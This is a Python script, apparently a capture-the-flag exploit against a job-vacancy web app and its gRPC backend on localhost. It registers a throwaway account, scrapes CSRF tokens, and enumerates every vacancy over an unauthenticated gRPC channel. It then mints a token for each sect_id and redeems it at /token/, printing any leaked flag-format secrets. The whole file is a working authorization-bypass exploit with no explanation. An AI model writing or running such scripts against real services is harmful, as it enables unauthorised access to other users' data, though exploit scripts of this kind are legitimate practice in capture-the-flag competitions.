
import random
import re

import grpc
import lorem
import protobuf.vacancies_pb2 as v
import protobuf.vacancies_pb2_grpc as v_grpc
import requests

HOST = "http://localhost:8000"


def getCSRF(resp: requests.Response) -> str:
    return re.findall(r'value="([A-z0-9]+)">', resp.text)[0]


def genName() -> str:
    return lorem.get_word(count=1) + str(random.randint(1, 999999))


def setNewUser(s: requests.Session) -> tuple[int, str, str]:
    resp = s.get(HOST+"/register")
    csrf = getCSRF(resp)

    name = genName()
    password = genName()

    resp = s.post(HOST+"/register/", data=dict(
        csrfmiddlewaretoken=csrf,
        username=name,
        password=password,
        can_be_invited=True,
    ))
    csrf = getCSRF(resp)

    resp = s.post(HOST+"/login/", data=dict(
        csrfmiddlewaretoken=csrf,
        username=name,
        password=password,
    ))

    id = re.findall(r'Добро пожаловать, (\d+)\.[0-9A-z]+!</h3>', resp.text)[0]

    return id, name, password


stub = v_grpc.VacanciesStub(grpc.insecure_channel("localhost:8033"))
s = requests.Session()

id, name, password = setNewUser(s)

for vacancy in stub.List(v.ListRequest()).vacancies:
    resp = stub.Create(v.CreateRequest(
        sect_id=vacancy.sect_id,
        description="dummy",
    ))

    token = resp.token
    resp = s.get(HOST+"/token/")

    resp = s.post(HOST+"/token/", data=dict(
        csrfmiddlewaretoken=getCSRF(resp),
        sekta=vacancy.sect_id,
        token=token,
        nickname="asdasd",
    ))

    match = re.search(r"([A-Z0-9]{31}=)", resp.text)

    if match != None:
        print(match[1], flush=True)
